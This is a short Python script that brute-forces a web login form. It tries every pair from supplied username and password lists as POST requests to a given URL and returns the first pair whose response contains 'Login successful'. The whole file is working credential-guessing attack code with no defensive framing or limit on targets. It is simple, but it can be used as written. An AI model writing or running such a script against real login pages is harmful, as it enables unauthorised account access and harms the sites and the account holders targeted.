import requests
from time import sleep

# Brute Forcing Function
def brute_force(url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            print(f"Trying: {username} / {password}")
            response = requests.post(url, data={'username': username, 'password': password})
            if "Login successful" in response.text:  # Change based on the actual response
                print(f"Success! Found credentials: {username} / {password}")
                return username, password
            sleep(1)  # Avoid hitting the server too fast
    print("Brute force failed: No valid credentials found.")
    return None
